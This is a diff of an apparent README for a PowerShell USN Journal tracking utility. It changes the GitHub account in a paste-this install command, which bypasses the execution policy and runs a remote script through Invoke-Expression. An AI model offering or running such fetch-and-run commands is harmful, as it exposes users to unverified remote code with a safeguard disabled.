@@ -1,4 +1,4 @@
-**`powershell Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass && powershell Invoke-Expression (Invoke-RestMethod https://raw.githubusercontent.com/usnjournal/read-journal/refs/heads/main/read-journal.ps1)`**
+**`powershell Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass && powershell Invoke-Expression (Invoke-RestMethod https://raw.githubusercontent.com/waaz1/read-journal/refs/heads/main/read-journal.ps1)`**
 
 🛠️ **USN Journal Tracker Tool**
 A PowerShell utility for monitoring file system changes using the NTFS USN Journal — ideal for tracking Minecraft world saves, mod changes, deleted files, and more.
